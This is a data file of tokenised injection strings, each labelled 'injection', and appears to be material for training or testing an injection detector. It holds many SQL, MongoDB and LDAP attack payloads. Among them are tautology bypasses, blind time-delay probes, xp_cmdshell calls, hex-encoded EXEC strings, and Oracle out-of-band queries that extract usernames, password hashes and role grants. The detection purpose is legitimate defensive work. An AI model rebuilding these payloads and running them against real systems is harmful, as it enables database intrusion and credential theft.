0,SMCLN MINUS MINUS,injection
1,SQUT SMCLN MINUS MINUS,injection
2,SQUT RPRN SMCLN MINUS MINUS,injection
3,SQUT SMCLN EXEC master DOT DOT xp_cmdshell SQUT ping INT DOT INT DOT INT DOT INT SQUT MINUS MINUS,injection
4,SQUT GRANT CONNECT TO NAME SMCLN GRANT resource TO NAME SMCLN MINUS MINUS,injection
5,SQUT OR INT EQ INT MINUS MINUS,injection
6,SQUT UNION LPRN SELECT ATR ATR VERSION RPRN MINUS MINUS,injection
7,SQUT UNION LPRN SELECT NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
8,SQUT UNION LPRN SELECT NULL CMMA NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
9,SQUT UNION LPRN SELECT NULL CMMA NULL CMMA NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
10,SQUT UNION LPRN SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
11,SQUT UNION LPRN SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA LPRN SELECT ATR ATR VERSION RPRN RPRN MINUS MINUS,injection
0,SQUT SMCLN IF NOT LPRN SUBSTRING LPRN LPRN SELECT ATR ATR VERSION RPRN CMMA INT CMMA INT RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
1,SQUT SMCLN IF NOT LPRN SUBSTRING LPRN LPRN SELECT ATR ATR VERSION RPRN CMMA INT CMMA INT RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
2,SQUT SMCLN IF NOT LPRN SUBSTRING LPRN LPRN SELECT ATR ATR VERSION RPRN CMMA INT CMMA INT RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
3,SQUT SMCLN IF NOT LPRN SUBSTRING LPRN LPRN SELECT ATR ATR VERSION RPRN CMMA INT CMMA INT RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
4,SQUT SMCLN IF NOT LPRN SELECT SYSTEM_USER RPRN LT GT SQUT sa SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
5,SQUT SMCLN IF is_srvrolemember LPRN SQUT sysadmin SQUT RPRN GT INT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
6,SQUT SMCLN IF NOT LPRN LPRN SELECT serverproperty LPRN SQUT isintegratedsecurityonly SQUT RPRN RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
7,SQUT SMCLN IF NOT LPRN LPRN SELECT serverproperty LPRN SQUT isintegratedsecurityonly SQUT RPRN RPRN LT GT INT RPRN waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
0,INT SQUT INT,injection
1,INT EXEC sp_ LPRN OR EXEC xp_ RPRN,injection
2,INT AND INT EQ INT,injection
3,INT SQUT AND INT EQ LPRN SELECT COUNT LPRN STAR RPRN FROM tablenames RPRN SMCLN MINUS MINUS,injection
4,INT OR INT EQ INT,injection
5,INT SQUT OR SQUT INT SQUT EQ SQUT INT,injection
6,1or1 EQ INT,injection
7,INT SQUT OR SQUT INT SQUT EQ SQUT INT,injection
8,fake ATR ema SQUT OR SQUT il DOT nl SQUT EQ SQUT il DOT nl,injection
0,INT,injection
1,INT AND user_name LPRN RPRN EQ SQUT dbo SQUT,injection
2,BSLSH SQUT SMCLN DESC users SMCLN MINUS MINUS,injection
3,INT BSLSH SQUT INT,injection
4,INT SQUT AND non_existant_table EQ SQUT INT,injection
5,SQUT OR username IS NOT NULL OR username EQ SQUT,injection
6,INT AND ascii LPRN LOWER LPRN SUBSTRING LPRN LPRN SELECT top INT NAME FROM sysobjects WHERE xtype EQ SQUT u SQUT RPRN CMMA INT CMMA INT RPRN RPRN RPRN GT INT,injection
7,INT UNION ALL SELECT INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA NAME FROM sysobjects WHERE xtype EQ SQUT u SQUT MINUS MINUS,injection
8,INT uni SLSH STAR STAR SLSH ON SELECT ALL FROM WHERE,injection
9,,injection
0,TRUE CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
1,CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
2,DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
3,SQUT CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
4,INT CMMA DLLR WHERE CLN SQUT INT EQ EQ INT SQUT,injection
5,LCBR DLLR ne CLN INT RCBR,injection
6,SQUT CMMA DLLR OR CLN LSQBR LCBR RCBR CMMA LCBR SQUT A SQUT CLN SQUT A,injection
7,SQUT RCBR RSQBR CMMA DLLR COMMENT CLN SQUT successful mongodb injection SQUT,injection
8,DB DOT injection DOT INSERT LPRN LCBR success CLN INT RCBR RPRN SMCLN,injection
9,DB DOT injection DOT INSERT LPRN LCBR success CLN INT RCBR RPRN SMCLN RETURN INT SMCLN DB DOT stores DOT mapreduce LPRN FUNCTION LPRN RPRN LCBR LCBR emit LPRN INT CMMA INT,injection
10,BITOR BITOR INT EQ EQ INT,injection
11,SQUT BITAND BITAND this DOT PASSWORD DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,injection
12,SQUT BITAND BITAND this DOT passwordzz DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,injection
13,SQUT PRCNT INT PRCNT INT PRCNT INT PRCNT 20this DOT PASSWORD DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,injection
14,SQUT PRCNT INT PRCNT INT PRCNT INT PRCNT 20this DOT passwordzz DOT MATCH LPRN SLSH DOT STAR SLSH RPRN SLSH SLSH PLUS PRCNT INT,injection
15,LCBR DLLR gt CLN SQUT SQUT RCBR,injection
16,LSQBR DLLR ne RSQBR EQ INT,injection
17,SQUT SMCLN sleep LPRN INT RPRN SMCLN,injection
18,SQUT SMCLN sleep LPRN INT RPRN SMCLN SQUT,injection
19,SQUT SMCLN sleep LPRN INT RPRN SMCLN PLUS SQUT,injection
20,SQUT SMCLN it EQ NEW PRCNT 20date LPRN RPRN SMCLN DO LCBR pt EQ NEW PRCNT 20date LPRN RPRN SMCLN RCBR WHILE LPRN pt MINUS it LT INT RPRN SMCLN,injection
0,â€™ OR â€˜1â€™ EQ â€™1,injection
1,SQUT OR SQUT INT SQUT EQ SQUT INT,injection
2,SQUT BITOR BITOR utl_http DOT request LPRN SQUT http CLN SLSH SLSH INT DOT INT DOT INT DOT INT SLSH SQUT RPRN BITOR BITOR SQUT,injection
3,SQUT BITOR BITOR myappadmin DOT adduser LPRN SQUT ADMIN SQUT CMMA SQUT newpass SQUT RPRN BITOR BITOR SQUT,injection
4,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT banner FROM v DLLR VERSION WHERE rownum EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
5,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT sys DOT login_user FROM DUAL RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
6,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT sys DOT database_name FROM DUAL RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
7,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT host_name FROM v DLLR INSTANCE RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
8,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT global_name FROM global_name RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
9,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN username RPRN RPRN FROM sys DOT all_users RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
10,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN PASSWORD RPRN RPRN FROM sys DOT USER DLLR RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
11,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN TABLE_NAME RPRN RPRN FROM sys DOT all_tables RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
12,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN COLUMN_NAME RPRN RPRN FROM sys DOT all_tab_columns RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
13,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT COUNT LPRN DISTINCT LPRN granted_role RPRN RPRN FROM dba_role_privs WHERE grantee EQ sys DOT login_user RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
14,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
15,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
16,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
17,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
18,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
19,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
20,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
21,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
22,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
23,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
24,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
25,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
26,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
27,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
28,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
29,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
30,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
31,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
32,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
33,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
34,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
35,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
36,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
37,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
38,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
39,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
40,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
41,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
42,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
43,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
44,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
45,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
46,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
47,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
48,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
49,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN username RPRN FROM LPRN SELECT DISTINCT LPRN username RPRN CMMA rownum AS LIMIT FROM sys DOT all_users RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
50,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN PASSWORD RPRN FROM LPRN SELECT DISTINCT LPRN PASSWORD RPRN CMMA rownum AS LIMIT FROM sys DOT USER DLLR RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
51,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN FROM LPRN SELECT DISTINCT LPRN TABLE_NAME RPRN CMMA rownum AS LIMIT FROM sys DOT all_tables RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
52,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN FROM LPRN SELECT DISTINCT LPRN COLUMN_NAME RPRN CMMA rownum AS LIMIT FROM all_tab_columns RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
53,SQUT AND INT EQ utl_inaddr DOT get_host_address LPRN LPRN SELECT DISTINCT LPRN granted_role RPRN FROM LPRN SELECT DISTINCT LPRN granted_role RPRN CMMA rownum AS LIMIT FROM dba_role_privs WHERE grantee EQ sys DOT loginuser RPRN WHERE LIMIT EQ INT RPRN RPRN AND SQUT i SQUT EQ SQUT i,injection
54,,injection
0,LT GT DQUT SQUT PRCNT SMCLN RPRN LPRN BITAND PLUS,injection
1,BITOR,injection
2,EXCLM,injection
3,QSTN,injection
4,SLSH,injection
5,SLSH SLSH,injection
6,SLSH SLSH STAR,injection
7,SQUT,injection
8,SQUT MINUS MINUS,injection
9,LPRN,injection
10,RPRN,injection
11,STAR BITOR,injection
12,STAR SLSH STAR,injection
13,BITAND,injection
14,INT,injection
15,INT,injection
16,INT OR INT EQ INT,injection
17,0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,injection
18,0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a,injection
19,0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,injection
20,INT SMCLN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN RPRN CMMA INT CMMA INT CMMA INT SMCLN,injection
21,INT OR INT EQ INT,injection
22,INT SMCLN SELECT PRCNT INT STAR,injection
23,INT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
24,SQUT PRCNT 20or PRCNT INT SQUT SQUT EQ SQUT,injection
25,SQUT PRCNT 20or PRCNT INT EQ INT,injection
26,SQUT RPRN PRCNT 20or PRCNT INT LPRN SQUT x SQUT EQ SQUT x,injection
27,SQUT PRCNT 20or PRCNT INT SQUT x SQUT EQ SQUT x,injection
28,PRCNT 20or PRCNT 20x EQ x,injection
29,PRCNT INT SQUT sleep PRCNT INT SQUT,injection
30,PRCNT INT DLLR LPRN sleep PRCNT INT RPRN,injection
31,PRCNT INT,injection
32,INT OR INT EQ INT,injection
33,PRCNT INT,injection
34,PRCNT INT PRCNT 20or PRCNT INT EQ INT,injection
35,PRCNT INT,injection
36,PRCNT INT,injection
37,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28mail PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,injection
38,PRCNT 2a PRCNT INT PRCNT 7c PRCNT 28objectclass PRCNT 3d PRCNT 2a PRCNT INT PRCNT INT,injection
39,PRCNT 2a PRCNT 7c,injection
40,BITOR BITOR INT,injection
41,SQUT BITOR BITOR SQUT INT,injection
42,LPRN BITOR BITOR INT RPRN,injection
43,PRCNT 7c,injection
44,A SQUT,injection
45,ADMIN SQUT OR SQUT,injection
46,SQUT AND INT EQ LPRN IF LPRN LPRN load_file LPRN CHAR LPRN INT CMMA INT CMMA INT CMMA INT CMMA INT RPRN RPRN LT GT CHAR LPRN INT CMMA INT RPRN RPRN CMMA INT CMMA INT RPRN RPRN SMCLN,injection
47,SQUT AND INT IN LPRN SELECT var FROM TEMP RPRN MINUS MINUS,injection
48,anything SQUT OR SQUT x SQUT EQ SQUT x,injection
49,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,injection
50,A SQUT OR INT EQ INT MINUS MINUS,injection
51,DQUT A DQUT DQUT OR INT EQ INT MINUS MINUS DQUT,injection
52,A SQUT OR INT EQ INT MINUS MINUS,injection
53,A SQUT OR SQUT A SQUT EQ SQUT A,injection
54,BITAND apos SMCLN PRCNT 20or,injection
55,AS,injection
56,ASC,injection
57,A SQUT waitfor delay SQUT INT CLN INT CLN INT SQUT MINUS MINUS,injection
58,SQUT SMCLN BEGIN DECLARE ATR var VARCHAR LPRN INT RPRN SET ATR var EQ SQUT CLN SQUT SELECT ATR var EQ ATR var PLUS SQUT PLUS login PLUS SQUT SLSH SQUT PLUS PASSWORD PLUS SQUT SQUT FROM users WHERE login GT,injection
59,bfilename,injection
60,CHAR PRCNT INT PRCNT INT PRCNT 2b PRCNT 40select,injection
61,DECLARE ATR q nvarchar LPRN INT RPRN 0x730065006c00650063007400200040004000760065007200730069006f006e00 EXEC LPRN ATR q RPRN,injection
62,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ 0x770061006900740066006f0072002000640065006c00610079002000270030003a0030003a0031003000270000 EXEC LPRN ATR q RPRN,injection
63,DECLARE ATR q nvarchar LPRN INT RPRN SELECT ATR q EQ,injection
64,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e EXEC LPRN ATR s RPRN,injection
65,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x77616974666f722064656c61792027303a303a31302700 EXEC LPRN ATR s RPRN,injection
66,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ,injection
67,DECLARE ATR s VARCHAR LPRN INT RPRN SELECT ATR s EQ 0x73656c65637420404076657273696f6e,injection
68,DELETE,injection
69,DESC,injection
70,DISTINCT,injection
71,SQUT BITOR BITOR LPRN elt LPRN MINUS INT PLUS INT CMMA bin LPRN INT RPRN CMMA ord LPRN INT RPRN CMMA HEX LPRN CHAR LPRN INT RPRN RPRN RPRN RPRN,injection
72,SQUT SMCLN EXEC master DOT DOT xp_cmdshell,injection
73,SQUT SMCLN EXEC master DOT DOT xp_cmdshell SQUT ping INT DOT INT DOT INT DOT INT SQUT MINUS MINUS,injection
74,EXEC LPRN ATR s RPRN,injection
75,SQUT SMCLN EXEC LPRN SQUT sel SQUT PLUS SQUT ect us SQUT PLUS SQUT er SQUT RPRN,injection
76,EXEC sp,injection
77,SQUT SMCLN EXECUTE IMMEDIATE SQUT sel SQUT BITOR BITOR SQUT ect us SQUT BITOR BITOR SQUT er SQUT,injection
78,EXEC xp,injection
79,SQUT SMCLN EXEC xp_regread,injection
80,SQUT GROUP BY userid HAVING INT EQ INT MINUS MINUS,injection
81,HANDLER,injection
82,HAVING,injection
83,SQUT HAVING INT EQ INT MINUS MINUS,injection
84,hi OR INT EQ INT MINUS MINUS DQUT,injection
85,hi SQUT OR INT EQ INT MINUS MINUS,injection
86,DQUT hi DQUT DQUT RPRN OR LPRN DQUT DQUT A DQUT DQUT EQ DQUT DQUT A DQUT,injection
87,hi OR A EQ A,injection
88,hi SQUT OR SQUT A SQUT EQ SQUT A,injection
89,hi SQUT RPRN OR LPRN SQUT A SQUT EQ SQUT A,injection
90,SQUT hi SQUT OR SQUT x SQUT EQ SQUT x SQUT SMCLN,injection
91,INSERT,injection
92,LIKE,injection
93,LIMIT,injection
94,STAR LPRN BITOR LPRN mail EQ STAR RPRN RPRN,injection
95,STAR LPRN BITOR LPRN objectclass EQ STAR RPRN RPRN,injection
96,OR,injection
97,SQUT OR SQUT SQUT EQ SQUT,injection
98,OR INT EQ INT HASH DQUT,injection
99,SQUT OR INT EQ INT MINUS MINUS,injection
100,SQUT OR INT EQ INT HASH,injection
101,DQUT OR INT EQ INT MINUS MINUS,injection
102,OR INT EQ INT MINUS MINUS,injection
103,OR INT EQ INT HASH,injection
104,SQUT OR INT MINUS MINUS SQUT,injection
105,SQUT OR INT SLSH STAR,injection
106,SMCLN OR SQUT INT SQUT EQ SQUT INT SQUT,injection
107,SQUT OR SQUT INT SQUT EQ SQUT INT,injection
108,SQUT OR SQUT INT SQUT EQ SQUT INT SQUT MINUS MINUS,injection
109,SQUT OR INT EQ INT,injection
110,SQUT OR INT EQ INT SLSH STAR,injection
111,SQUT OR INT EQ INT MINUS MINUS,injection
112,SQUT OR INT EQ INT MINUS MINUS,injection
